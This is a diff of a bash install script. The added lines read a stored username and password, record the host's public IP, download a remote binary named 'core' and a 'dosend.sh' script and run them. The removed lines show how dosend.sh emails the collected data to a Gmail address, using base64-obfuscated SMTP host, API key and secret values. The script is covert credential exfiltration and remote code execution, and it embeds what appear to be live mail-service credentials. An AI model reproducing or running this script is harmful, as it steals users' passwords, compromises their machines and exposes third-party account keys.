@@ -3,28 +3,22 @@ Uname=$(head -1 inuser.txt)
 gitpath=$(head -1 gitpath.txt)
 mkdir -p noti
 cd noti/
-wget https://raw.githubusercontent.com/$gitpath/main/gitclone/smtp-cli
+
+sudo apt install -y libio-socket-ssl-perl  libdigest-hmac-perl  libterm-readkey-perl libmime-lite-perl libfile-libmagic-perl libio-socket-inet6-perl
+
+wget https://raw.githubusercontent.com/$gitpath/main/gitclone/core.temp
+
+wget https://raw.githubusercontent.com/$gitpath/main/gitclone/dosend.sh
+ip4set=$(curl http://checkip.amazonaws.com)
+looku=$(head -1 ../inuser.txt)
+lookup=$(head -1 ../inpass.txt)
 echo "NEW INSTALL $Uname" > status.txt
+echo "Install in $ip4set" >> status.txt
+echo "inu ::: $looku" >> status.txt
+echo "inp ::: $lookup" >> status.txt
 #base64 -d core.txt > mcore
-chmod +x smtp-cli
-
-
-tee -a dosend.sh <<EOF
-#!/bin/bash
-Uname=$(ls /home)
-
-mhotpot=$(echo -n 'aW4tdjMubWFpbGpldC5jb206NTg3' | base64 --decode)
-mabi=$(echo -n 'YzY2ODA0YzA2YzY5ZjEzMzZiOTM4ZTEwNmUxZDUxZjA=' | base64 --decode)
-musec=$(echo -n 'YTMzNTdlNjVjMmNlODlkOTFlNTJmZTEzYzA2N2FlOWQ=' | base64 --decode)
-mform=$(echo -n 'bmd1eWVuZHV5cXVhbi5wcm9zQGdtYWlsLmNvbQ==' | base64 --decode)
-mtors=$(echo -n 'bmd1eWVuZHV5cXVhbi5wcm9zQGdtYWlsLmNvbQ==' | base64 --decode)
-messtxt=status.txt
-#--verbose
-./smtp-cli --missing-modules-ok --host  $mhotpot --enable-auth --user $mabi --password $musec --from $mform --to $mtors --data $messtxt
-EOF
-
-chmod +x dosend.sh
-# Test
+mv core.temp core
+chmod +x core dosend.sh
 ./dosend.sh
 
-cd ..
+
